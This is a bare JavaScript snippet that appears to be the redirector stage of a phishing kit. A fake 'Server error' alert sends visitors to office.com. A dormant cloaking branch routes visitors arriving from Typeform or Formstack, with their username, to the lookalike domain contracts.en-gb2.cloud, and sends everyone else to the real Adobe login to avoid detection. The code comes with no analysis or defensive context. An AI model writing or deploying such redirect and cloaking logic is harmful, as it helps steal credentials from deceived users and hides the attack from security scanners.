<script>
  if (1) {
    alert("Please try again in 1 hour - Server error");
    window.location = "https://office.com";
  } else {
  const ref = document.referrer;
  const qs = window.location.search;
  const urlParams = new URLSearchParams(qs);

  // if the cookie is set, redirect 
  if (localStorage.getItem("completed")) {
    window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
  } 

  else {
    if (urlParams.has("sc")) {
      // set cookie
      localStorage.setItem("completed", true);
      // redirect to end site
      window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
    } else {

      if (ref.match(/^https?:\/\/([^\/]+\.)?typeform\.com(\/|$)/i) || ref.match(/^https?:\/\/([^\/]+\.)?formstack\.com(\/|$)/i)) {

        if (urlParams.has("u")) {
          const u = urlParams.get("u");
          window.location = "https://contracts.en-gb2.cloud/?username=" + u;
        } else {
          window.location = "https://contracts.en-gb2.cloud"
        }
      } 

      else {
        window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
      }
        
    }
  }
  }

  

  
  
</script>
